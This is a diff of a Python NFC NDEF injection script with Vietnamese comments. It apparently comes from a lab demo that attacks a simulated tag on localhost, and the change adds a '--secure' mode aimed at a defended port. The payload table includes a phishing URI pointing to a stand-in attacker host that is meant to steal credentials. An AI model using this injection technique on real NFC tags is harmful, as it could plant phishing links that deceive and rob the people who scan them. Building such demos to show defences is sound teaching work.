@@ -1,12 +1,18 @@
 #!/usr/bin/env python3
-"""NFC NDEF Injector — ghi đè content thẻ NFC bằng payload giả mạo"""
-import socket, json
+"""
+NFC NDEF Injector — ghi đè content thẻ NFC bằng payload giả mạo
+
+Usage:
+    python nfc_injector.py              # Tấn công NFC tag thường (port 6011) — VULNERABLE
+    python nfc_injector.py --secure     # Tấn công Secure NFC tag (port 6012) — BLOCKED
+"""
+import socket, json, sys
 import ndef
 from colorama import Fore, init
 init(autoreset=True)
 
 NFC_HOST = '127.0.0.1'
-NFC_PORT = 6011
+NFC_PORT = 6012 if '--secure' in sys.argv else 6011
 
 PAYLOADS = {
     'phishing_url': ('URI', 'https://evil.attacker.com/steal-credentials'),
@@ -37,7 +43,9 @@ def inject(ptype: str):
     s.close()
     return resp
 
-print(f'{Fore.RED}=== NFC NDEF Injection Attack ===\n')
+mode = f"SECURE NFC Tag (port {NFC_PORT}) — Defense ON" if '--secure' in sys.argv else f"NFC Tag (port {NFC_PORT}) — No Defense"
+print(f'{Fore.RED}=== NFC NDEF Injection Attack ===')
+print(f'{Fore.CYAN}Target: {mode}\n')
 for ptype in ['phishing_url','malicious_text']:
     print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
     r = inject(ptype)
